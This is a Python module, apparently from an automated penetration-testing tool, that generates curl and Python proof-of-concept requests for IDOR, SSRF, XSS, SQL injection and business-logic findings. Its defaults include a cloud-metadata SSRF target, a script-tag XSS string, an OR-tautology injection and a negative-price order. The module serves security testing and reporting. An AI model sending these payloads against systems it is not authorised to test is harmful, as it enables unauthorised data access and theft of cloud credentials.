"""Phase 6: POC Generator - Generate reproducible curl and code PoCs."""

from typing import Any

import httpx


class POCGenerator:
    """Generate copy-pasteable PoCs (curl, Python, JavaScript) for findings."""

    def __init__(self):
        self.pocs: list[dict[str, Any]] = []

    async def generate_poc(
        self,
        finding_type: str,
        endpoint: str,
        payload: dict[str, Any] | str,
        session_token: str = "",
        base_url: str = "",
    ):
        """Generate PoC for a specific vulnerability finding."""

        if finding_type == "idor":
            return self._generate_idor_poc(endpoint, payload, session_token, base_url)
        elif finding_type == "ssrf":
            return self._generate_ssrf_poc(endpoint, payload, session_token, base_url)
        elif finding_type == "xss":
            return self._generate_xss_poc(endpoint, payload, base_url)
        elif finding_type == "injection":
            return self._generate_injection_poc(
                endpoint, payload, session_token, base_url
            )
        elif finding_type == "business_logic":
            return self._generate_business_logic_poc(
                endpoint, payload, session_token, base_url
            )
        else:
            return self._generate_generic_poc(
                endpoint, payload, session_token, base_url
            )

    def _generate_idor_poc(
        self, endpoint: str, payload: dict[str, Any], session_token: str, base_url: str
    ) -> dict[str, Any]:
        """Generate IDOR PoC (accessing another user's resources)."""
        victim_id = payload.get("victim_id", "456")

        curl_cmd = f"""curl -X GET "{base_url}{endpoint}?id={victim_id}" \\
  -H "Authorization: Bearer {session_token}" \\
  -H "Accept: application/json"
"""

        python_poc = f"""import httpx

async with httpx.AsyncClient() as client:
    response = await client.get(
        "{base_url}{endpoint}?id={victim_id}",
        headers={{"Authorization": "Bearer {session_token}"}}
    )
    print(f"Status: {{response.status_code}}")
    print(f"Data: {{response.text}}")
"""

        return {
            "finding_type": "IDOR",
            "endpoint": endpoint,
            "impact": "Unauthorized access to another users data",
            "curl": curl_cmd,
            "python": python_poc,
            "reproduction_steps": [
                f"Send GET request to {endpoint}?id={victim_id}",
                "Use victim users ID instead of your own",
                "Observe successful response with unauthorized data",
            ],
        }

    def _generate_ssrf_poc(
        self, endpoint: str, payload: dict[str, Any], session_token: str, base_url: str
    ) -> dict[str, Any]:
        """Generate SSRF PoC (accessing internal resources)."""
        ssrf_target = payload.get("target", "169.254.169.254/latest/meta-data")

        curl_cmd = f"""curl -X POST "{base_url}{endpoint}" \\
  -H "Authorization: Bearer {session_token}" \\
  -H "Content-Type: application/json" \\
  -d '{{"url": "{ssrf_target}"}}'
"""

        return {
            "finding_type": "SSRF",
            "endpoint": endpoint,
            "target_resource": ssrf_target,
            "impact": "Access to internal resources or cloud metadata",
            "curl": curl_cmd,
            "reproduction_steps": [
                f"Identify parameter accepting URL: {endpoint}",
                f"Send request with internal target: {ssrf_target}",
                "Observe server-side response exposure",
            ],
        }

    def _generate_xss_poc(
        self, endpoint: str, payload: dict[str, Any], base_url: str
    ) -> dict[str, Any]:
        """Generate XSS PoC."""
        xss_payload = payload.get("payload", '<script>alert("XSS")</script>')
        param = payload.get("param", "q")

        curl_cmd = f"""curl "{base_url}{endpoint}?{param}={xss_payload.replace('"', '%22')}"
"""

        return {
            "finding_type": "XSS",
            "endpoint": endpoint,
            "parameter": param,
            "payload": xss_payload,
            "impact": "Session hijacking, credential stealing",
            "curl": curl_cmd,
            "reproduction_steps": [
                f"Input XSS payload into parameter: {param}",
                "Observe JavaScript execution in browser",
            ],
        }

    def _generate_injection_poc(
        self, endpoint: str, payload: dict[str, Any], session_token: str, base_url: str
    ) -> dict[str, Any]:
        """Generate injection PoC (SQLi, Command Injection, etc.)."""
        injection_payload = payload.get("payload", "' OR '1'='1")

        curl_cmd = f"""curl -X POST "{base_url}{endpoint}" \\
  -H "Authorization: Bearer {session_token}" \\
  -H "Content-Type: application/json" \\
  -d '{{"query": "{injection_payload}"}}'
"""

        return {
            "finding_type": "Injection",
            "endpoint": endpoint,
            "payload": injection_payload,
            "impact": "Database manipulation, data exfiltration",
            "curl": curl_cmd,
            "reproduction_steps": [
                "Identify vulnerable parameter",
                f"Send injection payload: {injection_payload}",
                "Observe altered behavior or data exposure",
            ],
        }

    def _generate_business_logic_poc(
        self, endpoint: str, payload: dict[str, Any], session_token: str, base_url: str
    ) -> dict[str, Any]:
        """Generate Business Logic PoC (price bypass, race condition, etc.)."""
        test_case = payload.get("test_case", "negative_price")

        curl_cmd = f"""curl -X POST "{base_url}{endpoint}" \\
  -H "Authorization: Bearer {session_token}" \\
  -H "Content-Type: application/json" \\
  -d '{{"price": "-100", "quantity": "1"}}'
"""

        return {
            "finding_type": "Business Logic",
            "endpoint": endpoint,
            "test_case": test_case,
            "impact": "Financial loss, inventory manipulation",
            "curl": curl_cmd,
            "reproduction_steps": [
                f"Test case: {test_case}",
                "Send negative price or manipulated values",
                "Observe processing without validation",
            ],
        }

    def _generate_generic_poc(
        self,
        endpoint: str,
        payload: dict[str, Any] | str,
        session_token: str,
        base_url: str,
    ) -> dict[str, Any]:
        """Generate generic PoC."""
        payload_str = str(payload)

        curl_cmd = f"""curl -X GET "{base_url}{endpoint}" \\
  -H "Authorization: Bearer {session_token}" \\
  -H "Content-Type: application/json"
"""

        return {
            "finding_type": "Generic",
            "endpoint": endpoint,
            "payload": payload_str,
            "curl": curl_cmd,
        }
